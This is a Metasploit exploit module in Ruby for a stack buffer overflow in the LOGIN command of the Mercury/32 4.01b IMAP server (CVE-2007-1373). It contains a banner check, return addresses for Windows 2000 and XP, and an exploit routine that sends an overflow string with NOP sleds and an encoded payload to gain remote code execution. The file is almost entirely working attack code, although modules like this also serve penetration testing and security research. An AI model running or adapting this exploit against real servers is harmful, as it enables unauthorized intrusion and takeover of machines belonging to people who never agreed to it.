##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Mercury/32 LOGIN Buffer Overflow',
      'Description'    => %q{
        This module exploits a stack buffer overflow in Mercury/32 <= 4.01b IMAPD
        LOGIN verb. By sending a specially crafted login command, a buffer
        is corrupted, and code execution is possible. This vulnerability was
        discovered by (mu-b at digit-labs.org).
      },
      'Author'         => [ 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2007-1373' ],
          [ 'OSVDB', '33883' ],
        ],
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'Space'    => 800,
          'BadChars' => "\x00\x0a\x0d\x20",
          'StackAdjustment' => -3500,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows 2000 SP0-SP4 English',		{ 'Ret' => 0x75022ac4 } ],
          [ 'Windows XP Pro SP0/SP1 English',		{ 'Ret' => 0x71aa32ad } ],
        ],
      'DisclosureDate' => 'Mar 6 2007',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(143)
      ], self.class)
  end

  def check
    connect
    resp = sock.get_once
    disconnect

    if (resp =~ /Mercury\/32 v4\.01[a-b]/)
      return Exploit::CheckCode::Appears
    end
      return Exploit::CheckCode::Safe
  end

  def exploit
    connect
    sock.get_once

    num = rand(255).to_i

    sploit = "A001 LOGIN " + (" " * 1008) + "{#{num}}\n"
    sock.put(sploit)
    sock.get_once

    sploit << rand_text_alpha_upper(255)
    sock.put(sploit)
    sock.get_once

    sploit << make_nops(5295 - payload.encoded.length)
    sploit << payload.encoded + Rex::Arch::X86.jmp_short(6)
    sploit << make_nops(2) + [target.ret].pack('V')
    sploit << [0xe8, -1200].pack('CV') + rand_text_alpha_upper(750)

    print_status("Trying target #{target.name}...")

    sock.put(sploit)
    select(nil,nil,nil,1)

    handler
    disconnect
  end

end
